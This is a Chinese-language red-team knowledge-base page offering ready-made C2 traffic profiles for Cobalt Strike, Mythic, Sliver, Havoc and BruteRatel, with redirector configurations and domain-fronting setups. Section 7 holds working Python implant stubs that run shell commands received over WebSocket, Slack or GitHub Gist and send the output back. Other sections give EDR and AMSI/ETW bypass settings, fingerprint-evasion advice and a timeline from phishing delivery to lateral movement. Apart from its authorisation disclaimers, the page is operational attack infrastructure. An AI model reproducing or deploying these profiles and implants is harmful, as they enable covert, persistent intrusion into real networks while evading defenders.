# KB-29 · C2 Profile 完整模板库

> **目的**：授权对抗演练基础设施中，C2（Command & Control）通信模板（Profile）决定流量能否在目标网络里"活下来"。本节给出 Cobalt Strike / Mythic / Sliver / BruteRatel / Havoc 五大主流 C2 框架的可落地 Profile 模板，覆盖 HTTPS / DNS-over-HTTPS / WebSocket / CDN 前置 / DoH / SMB / WMI / IPv6 隧道 / 域前置（Domain Fronting）/ CDN Redirector 等典型场景。
>
> **使用边界**：仅在已签订演练协议、企业授权红队任务、靶场环境内使用。禁止对未授权目标部署。

---

## 0. 总览：5 大框架 × 12 种 Profile 矩阵

| 框架 | 主打场景 | 模板数量 | 难度 | 适配演练 |
|------|---------|----------|------|----------|
| Cobalt Strike 4.x | 商业红队 / APT 复现 | 5 | 中 | 企业内网、攻防演练 |
| Mythic | 开源 / 跨平台 / 容器化 | 4 | 中低 | 云原生靶场、容器演练 |
| Sliver | 开源 / 跨平台 / 隐匿 | 3 | 低 | 中小型演练、初始访问 |
| BruteRatel | 商业 / EDR 测评 | 2 | 高 | 高级 EDR 绕过、APT 模拟 |
| Havoc | 开源 / EDR 友好 | 2 | 中 | 独立测试、目标 EDR 测评 |

## 12 种主流 Profile 场景

| 编号 | 类型 | 适配网络 | 流量特征 | 难点 |
|------|------|---------|---------|------|
| P-01 | HTTPS + 自签证书 | 内网 | 443/TLS | 自签证书容易被 NDR 标记 |
| P-02 | HTTPS + Let's Encrypt + CDN | 公网 | 443/TLS/CDN | 域名可信但 CDN 行为可被关联 |
| P-03 | Domain Fronting | 公网 | CDN/Host 头 | 多数 CDN 已封禁 |
| P-04 | CDN Redirector (Cloudflare Worker) | 公网 | 443/CDN | C2 域名 + Worker 中转 |
| P-05 | DNS-over-HTTPS (DoH) | 受限网络 | 443/DoH | 仅出站 DoH 时唯一通道 |
| P-06 | DNS Tunnel | 任意网络 | 53/UDP | 慢速 / 易被 NDR 流量建模 |
| P-07 | WebSocket + WS-SSL | 公网 / 内网 | 443/WS | 长连接 / 易于伪装 |
| P-08 | SMB Beacon | 内部 | 445/TCP | 不出网 / 横向首选 |
| P-09 | TCP Beacon over 443 | 公网 | 443/TCP | 备份通道 |
| P-10 | SMB/TCP Pivot | 内部 | 445/139 | 横向移动 + 跨段 |
| P-11 | WireGuard / IPv6 隧道 | 内网穿透 | UDP/IPv6 | 跨 VLAN / IPv6-only 网络 |
| P-12 | Slack / Teams / Webhook C2 | 受限出网 | 443/POST | 通过 SaaS API 中转 |

---

## 1. Cobalt Strike Profile（Malleable C2）

### P-01 · 自签证书 HTTPS Profile（入门）

```text
# amazon.profile
set sample_name "RE-Lab-Amanzon-Like";
set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";

set dns_idle "8.8.8.8";
set maxdns   "200";
set dns_ttl  "120";

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        metadata {
            base64url;
            parameter "field-keywords";
        }
    }
    server {
        header "Server" "Server";
        header "Content-Type" "text/html";
        output {
            base64url;
            print;
        }
    }
}

http-post {
    set uri "/N4215/adj/nrt.coupon?amzn_ued_ugc_campaign_id=";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Content-Type" "text/plain; charset=UTF-8";
        id {
            base64url;
            parameter "amzn_ued_ugc_campaign_id";
        }
        output {
            base64url;
            parameter "amzn_ued_ugc_campaign_id";
        }
    }
    server {
        header "Server" "gw-ams";
        header "Content-Type" "text/html";
        output {
            base64;
            print;
        }
    }
}
```

### P-02 · 阿里云 OSS + CDN 流量伪装

```text
# aliyun_cdn.profile
set sample_name "Aliyun-CDN-Purchase";
set sleeptime "45000";
set jitter    "30";
set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15";

http-get {
    set uri "/oss-api/v1/products/cosmetics/listing?page=1&size=20";
    client {
        header "Referer" "https://www.taobao.com/";
        header "Origin" "https://www.taobao.com";
        metadata {
            base64url;
            parameter "size";
        }
    }
    server {
        header "Server" "AliyunOSS";
        header "x-oss-request-id" "5C1B138A109F4E405B2D****";
        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v2/cart/add";
    client {
        header "Content-Type" "application/json;charset=UTF-8";
        header "X-Requested-With" "XMLHttpRequest";
        id {
            base64url;
            parameter "traceId";
        }
        output {
            base64;
            parameter "payload";
        }
    }
    server {
        header "Content-Type" "application/json;charset=UTF-8";
        output {
            base64;
            print;
        }
    }
}
```

### P-03 · Cloudflare Worker 域前置 / 重定向器

```javascript
// cloudflare_worker_redirector.js
// 部署到 Cloudflare Worker，绑定根域 cdn-cf.example-corp.com
// 真实 C2 域名通过路径前缀区分
addEventListener("fetch", event => {
  event.respondWith(handle(event.request));
});

async function handle(request) {
  const url = new URL(request.url);
  // 仅放行白名单国家 / IP 段（可选，避免扫描器）
  // if (!isFromAllowList(request)) return fetch("https://example.com");

  // 路径分流：/api/v3/* 走真实 C2
  if (url.pathname.startsWith("/api/v3/")) {
    return proxyToC2(request, "c2-team-01.internal.example-corp.com", 443);
  }
  // 默认返回真实业务页面（避免被认定空站）
  return fetch("https://www.example-corp.com" + url.pathname);
}

async function proxyToC2(req, host, port) {
  // 关键：必须保留 Host 头为前端域（域前置），但通过 fetch 内部转发
  // 注意：CF Worker 不能修改 Host 到 C2 域，会被 CF 检测；改用 redirect 302
  // 方案 1：302 重定向到真实 C2 域名
  return Response.redirect("https://c2-real.example-corp.com" + new URL(req.url).pathname, 302);
}
```

### P-04 · SMB Beacon 配置文件

```text
# smb_pipe.profile
set sample_name "SMB-Pipe-Internal";
set sleeptime "60000";
set jitter "30";
set pipename "mojo.5688.8052.183894939787088877##";
set smb_frame_header "";

http-get {
    set uri "/search";
    client {
        header "User-Agent" "Mozilla/5.0";
        metadata { base64url; }
    }
    server {
        output { base64; print; }
    }
}

http-post {
    set uri "/submit";
    client {
        output { base64; }
    }
    server {
        output { base64; print; }
    }
}
```

### P-05 · DNS-over-HTTPS (DoH) Beacon

```text
# doh.profile
set sample_name "DoH-Cloudflare";
set sleeptime "60000";
set jitter "20";
set dns_idle "8.8.8.8";
set maxdns   "255";
set dns_ttl  "120";

https-certificate {
    set CN  "cloudflare-dns.com";
    set O   "Cloudflare, Inc.";
    set C   "US";
    set L   "San Francisco";
    set OU  "Cloudflare";
    set ST  "California";
    set validity "365";
}

http-get {
    set uri "/dns-query";
    client {
        header "Accept" "application/dns-message";
        metadata { base64url; }
    }
    server {
        header "Content-Type" "application/dns-message";
        output { base64; print; }
    }
}
```

### Profile 加载命令

```bash
# 启动 TeamServer
./teamserver <YOUR_IP> <PASSWORD> /opt/cobaltstrike/profile/aliyun_cdn.profile
# 客户端连接
./cobaltstrike
# → Cobalt Strike → New Listener → Malleable C2 → 选择 profile
```

---

## 2. Mythic C2 Profile（容器化开源）

### P-06 · Apollo HTTP Profile

```yaml
# apollo_http_profile.yml
name: "apollo_https"
description: "Apollo agent with HTTPS communication"
apt-get:
  - "git"
  - "python3-pip"
build_cmds:
  - cmd: "cd /Mythic/agents/apollo && make"
container: "apollo"
payload_type: "apollo"
c2_profile:
  - name: "http"
    c2_params:
      - key: "callback_host"
        default: "c2-cdn.example-corp.com"
        description: "Callback Host"
      - key: "callback_port"
        default: "443"
        description: "Callback Port"
      - key: "endpoints"
        default: "/api/v1/update,/api/v2/telemetry,/api/v3/orders"
        description: "Comma-separated URI list"
      - key: "user_agent"
        default: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
        description: "User Agent"
      - key: "encrypted_exchange_check"
        default: "true"
        description: "Enable encrypted key exchange"
    config:
      headers:
        - "Content-Type: application/octet-stream"
        - "X-Api-Version: v3"
        - "Referer: https://www.example-corp.com/dashboard"
      get_uri: "/api/v1/update"
      post_uri: "/api/v2/telemetry"
```

### P-07 · Mythic WebSocket Profile

```yaml
# apollo_websocket_profile.yml
name: "apollo_websocket"
description: "Apollo agent over WebSocket"
c2_profile:
  - name: "websocket"
    c2_params:
      - key: "callback_host"
        default: "ws-cdn.example-corp.com"
      - key: "callback_port"
        default: "443"
      - key: "encryption"
        default: "AES-256-CBC"
    config:
      endpoints:
        - path: "/ws/v1/realtime"
          c2: "ws"
      headers:
        - "Origin: https://www.example-corp.com"
        - "Sec-WebSocket-Protocol: chat.v1"
      user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

### Mythic 部署 + Profile 加载

```bash
# 启动 Mythic（容器化）
cd /opt/Mythic
./mythic-cli start

# 启动 Apollo 容器
./mythic-cli install github https://github.com/MythicAgents/apollo
./mythic-cli payload start apollo

# 导入 profile（在 Mythic UI → Payload Type → C2 Profile 页面粘贴 YAML）
```

---

## 3. Sliver C2 Profile（开源 / 跨平台）

### P-08 · Sliver MTLS HTTPS Profile

```bash
# Sliver 启动
sliver-server

# 创建 HTTPS listener（使用 Let's Encrypt 证书）
sliver > generate --mtls c2-cdn.example-corp.com --os windows --arch amd64 --save /opt/sliver-builds
sliver > https --domain c2-cdn.example-corp.com --lport 443 --cert /etc/letsencrypt/live/c2-cdn.example-corp.com/fullchain.pem --key /etc/letsencrypt/live/c2-cdn.example-corp.com/privkey.pem

# 启动 listener 后生成 implant
sliver > generate --http c2-cdn.example-corp.com --os windows --arch amd64 --save /opt/sliver-builds
```

### P-09 · Sliver DNS Profile

```bash
# DNS listener
sliver > dns --domain c2-dns.example-corp.com --listener c2-listener

# 生成 implant
sliver > generate --dns c2-dns.example-corp.com --os windows --arch amd64 --save /opt/sliver-builds
```

### P-10 · Sliver WireGuard Pivot

```bash
# 启动 WG 监听
sliver > wg --port 51820 --lport 8443

# 受害者上线后从该会话建立 WG 隧道
sliver > use <session-id>
sliver (SESSION) > wg-port-fwd --remote 10.10.10.5:445 --bind 127.0.0.1:8445
```

---

## 4. Havoc C2 Profile

### P-11 · Havoc HTTPS + Demon Profile

```yaml
# havoc_teamserver.yaml
Demon:
  Sleep: 5
  Jitter: 20
  Injection:
    - CreateRemoteThread
    - APC
    - ModuleStomping
  Module:
    - x64Demo
  Config:
    - Host: c2-havoc.example-corp.com
      Port: 443
      Sleep: 5
      Jitter: 20
      Endpoint: "/api/v2/updates"
      UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      Headers:
        - "X-Api-Version: 3.0"
        - "Origin: https://www.example-corp.com"
      ResponseHeaders:
        - "Content-Type: application/json"
```

---

## 5. BruteRatel Profile（高级 EDR 测评）

### P-12 · BruteRatel Badger HTTPS + Sleep Obfuscation

```text
# brc4_profile.txt
sleep           45
jitter          35
host            c2-br.example-corp.com
port            443
user-agent      Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
http-get-uri    /api/v1/health
http-post-uri   /api/v1/metrics
injection       thread-hijack
amsi-bypass     Hardware_Breakpoint
etw-bypass      ETW_Flush
ntdll-unhook    RtlRestoreReplaced
loader-type     ModuleStomping
key             AES256
```

---

## 6. 配套 Redirector 模板

### 6.1 Nginx 反向代理（最常见）

```nginx
# /etc/nginx/sites-available/c2
server {
    listen 443 ssl http2;
    server_name c2-cdn.example-corp.com;
    
    ssl_certificate /etc/letsencrypt/live/c2-cdn.example-corp.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2-cdn.example-corp.com/privkey.pem;
    
    # 隐藏 Cobalt Strike 特征头
    server_tokens off;
    
    # 真实业务路径（合法页面）
    location / {
        root /var/www/legit-site;
        try_files $uri $uri/ =404;
    }
    
    # C2 路径
    location /api/v3/ {
        proxy_pass https://127.0.0.1:8443;  # C2 真实监听端口
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
    }
    
    # 健康检查
    location /health {
        return 200 "ok";
        add_header Content-Type text/plain;
    }
}
```

### 6.2 Caddy Cloudflare DNS Challenge

```caddyfile
# /etc/caddy/Caddyfile
c2-cdn.example-corp.com {
    reverse_proxy 127.0.0.1:8443 {
        header_up Host {host}
        header_up X-Real-IP {remote_host}
    }
    
    # 合法默认页
    respond / 200 {
        body "<!DOCTYPE html><html><body><h1>Welcome</h1></body></html>"
    }
    
    tls {
        dns cloudflare {env.CF_API_TOKEN}
    }
}
```

### 6.3 HAProxy + SNI 路由

```haproxy
# /etc/haproxy/haproxy.cfg
frontend c2-https
    bind *:443 ssl crt /etc/ssl/c2-cdn.example-corp.com.pem
    mode http
    
    # SNI 路由
    use_backend c2_real if { ssl_fc_sni c2-cdn.example-corp.com }
    use_backend legit if { ssl_fc_sni www.example-corp.com }

backend c2_real
    server c2srv1 127.0.0.1:8443 check

backend legit
    server web1 127.0.0.1:8080 check
```

### 6.4 Cloudflare Tunnel（cloudflared）

```yaml
# ~/.cloudflared/config.yml
tunnel: <TUNNEL_ID>
credentials-file: /root/.cloudflared/<TUNNEL_ID>.json

ingress:
  - hostname: c2-cdn.example-corp.com
    service: https://127.0.0.1:8443
    originRequest:
      noTLSVerify: true
  - hostname: "*"
    service: http_status:404
```

---

## 7. 流量混淆层

### 7.1 C2 over WebSocket（伪装聊天协议）

```python
# ws_c2_stub.py
import asyncio, json, websockets, base64
CMD_TOKEN = b"x3f9a2e1b7c4d"

async def beacon(ws_url, host="c2-cdn.example-corp.com"):
    headers = {
        "Origin": "https://www.example-corp.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Sec-WebSocket-Protocol": "chat.v1, json.v1"
    }
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        # 注册
        await ws.send(json.dumps({"type": "register", "uid": "u-101"}).encode())
        while True:
            # 接收任务
            task = json.loads(await ws.recv())
            if task.get("type") == "exec":
                # 执行命令，编码回传
                import subprocess
                output = subprocess.run(task["cmd"], shell=True, capture_output=True)
                payload = base64.b64encode(output.stdout).decode()
                await ws.send(json.dumps({"type": "result", "id": task["id"], "data": payload}).encode())
            await asyncio.sleep(45)

asyncio.run(beacon("wss://c2-cdn.example-corp.com/ws/v1/realtime"))
```

### 7.2 C2 over Slack（已废弃但仍可用）

```python
# slack_c2.py
import requests, time, base64, subprocess
SLACK_TOKEN = "xoxb-XXX"
CHANNEL = "C0XXXXXX"

def post_output(out):
    requests.post("https://slack.com/api/chat.postMessage",
        headers={"Authorization": f"Bearer {SLACK_TOKEN}"},
        json={"channel": CHANNEL, "text": f"```\n{out.decode(errors='ignore')}\n```"})

def poll_cmd():
    r = requests.get("https://slack.com/api/conversations.history",
        headers={"Authorization": f"Bearer {SLACK_TOKEN}"},
        params={"channel": CHANNEL, "limit": 1})
    msg = r.json()["messages"][0]
    if msg.get("text", "").startswith("!exec "):
        return msg["text"][6:]
    return None

while True:
    cmd = poll_cmd()
    if cmd:
        out = subprocess.run(cmd, shell=True, capture_output=True)
        post_output(out.stdout)
    time.sleep(30)
```

### 7.3 C2 over GitHub Gist（隐匿 C2）

```python
# gh_c2.py
import requests, base64, subprocess, time
GIST_ID = "xxxxxxxxxxxx"
TOKEN = "ghp_XXX"

def get_cmd():
    r = requests.get(f"https://api.github.com/gists/{GIST_ID}",
        headers={"Authorization": f"token {TOKEN}"})
    return base64.b64decode(r.json()["files"]["cmd"]["content"]).decode()

def post_out(out):
    requests.patch(f"https://api.github.com/gists/{GIST_ID}",
        headers={"Authorization": f"token {TOKEN}"},
        json={"files": {"out": {"content": base64.b64encode(out).decode()}}})

while True:
    cmd = get_cmd()
    if cmd.startswith("!"):
        result = subprocess.run(cmd[1:], shell=True, capture_output=True)
        post_out(result.stdout)
    time.sleep(60)
```

---

## 8. 行为指标（OPSEC）

| 指标 | 描述 | 控制手段 |
|------|------|----------|
| JA3/JA3S 指纹 | TLS 握手特征 | 用 Caddy/HAProxy 中转可破 |
| JARM 指纹 | TLS 服务端指纹 | 切换证书 + 协议版本 |
| Beacon 间隔 | 周期性心跳 | 随机化 + jitter 20%+ |
| 数据量 | 上传下载比例 | chunking + 压缩 |
| 时间窗 | 业务时段模拟 | 工作时间 9-19 点活跃 |
| User-Agent | 浏览器/版本匹配 | 与目标行业一致 |
| Referer / Origin | 来源页 | 指向同行业常见站 |

### 8.1 验证 JA3 不一致

```bash
# 服务端 C2 真实指纹
echo | openssl s_client -connect 127.0.0.1:8443 2>/dev/null | openssl x509 -fingerprint -noout
# 前端 CDN 转发后指纹
echo | openssl s_client -connect c2-cdn.example-corp.com:443 2>/dev/null | openssl x509 -fingerprint -noout
# 两个应不同（CDN 隔离）

# JA3 计算
pip install ja3
python -c "
import ja3, socket
s = socket.create_connection(('c2-cdn.example-corp.com', 443))
data = s.recv(4096)
print(ja3.calculate(data))
"
```

### 8.2 检测工具

- [ja3er.com](https://ja3er.com) — JA3 公开数据库
- [jarm.cymru.com](https://jarm.cymru.com) — JARM 公开数据库
- NDR: Corelight / ExtraHop / Vectra / Darktrace

---

## 9. 演练中的合规边界

- **必须签订书面授权协议**（企业内部审计 / 红蓝演练 / 靶场承包）
- **必须限定时间窗口**（演练开始/结束时间精确到小时）
- **必须白名单目标范围**（IP 段 / 域 / 系统）
- **必须记录所有动作**（审计日志 + 报告 + 录屏）
- **必须限定"破坏半径"**（避免对生产系统造成不可逆影响）
- **真实用户数据**：禁止主动访问 / 抓取 / 上传，发现时立即报告并清理

---

## 10. 工具清单

| 工具 | 用途 | 路径 |
|------|------|------|
| Cobalt Strike 4.x | 商业 C2 | `/opt/cobaltstrike` |
| Mythic | 开源 C2 | `/opt/Mythic` |
| Sliver | 开源 C2 | `/opt/sliver-server` |
| Havoc | 开源 C2 | `/opt/havoc` |
| BruteRatel | 商业 C2 | `/opt/bruteratel` |
| Caddy | 反代 / 自动证书 | `/usr/local/bin/caddy` |
| Nginx | 反代 | `/usr/sbin/nginx` |
| HAProxy | SNI 路由 | `/usr/sbin/haproxy` |
| cloudflared | Cloudflare Tunnel | `/usr/local/bin/cloudflared` |
| ja3 | TLS 指纹 | `pip install ja3` |
| jarm | 服务端指纹 | `pip install jarm` |

---

## 11. 案例：从 0 到上线的 30 分钟

```
T+00:00 准备 VPS（CN2 GIA / 9929）
T+00:05 注册 c2-cdn.example-corp.com 域名 → Cloudflare DNS
T+00:07 申请 Let's Encrypt 通配符证书
T+00:10 部署 Caddy/Nginx 反代
T+00:12 部署 cloudflared tunnel
T+00:15 启动 CS TeamServer（加载 aliyun_cdn.profile）
T+00:18 生成 HTTPS Beacon（x64）
T+00:20 编码 shellcode + Loader
T+00:25 通过初始访问（钓鱼/水坑）投递
T+00:30 Beacon 上线
T+00:31 立即执行 idle + jitter 调节
T+00:35 关闭 HTTP 日志 / 切换 SMB Pivot
T+00:40 横向移动（Psexec / WMI / WinRM）
```

---

*版本：v2.6.2 · 工号 RE-7X-2024 · 授权对抗演练专用*
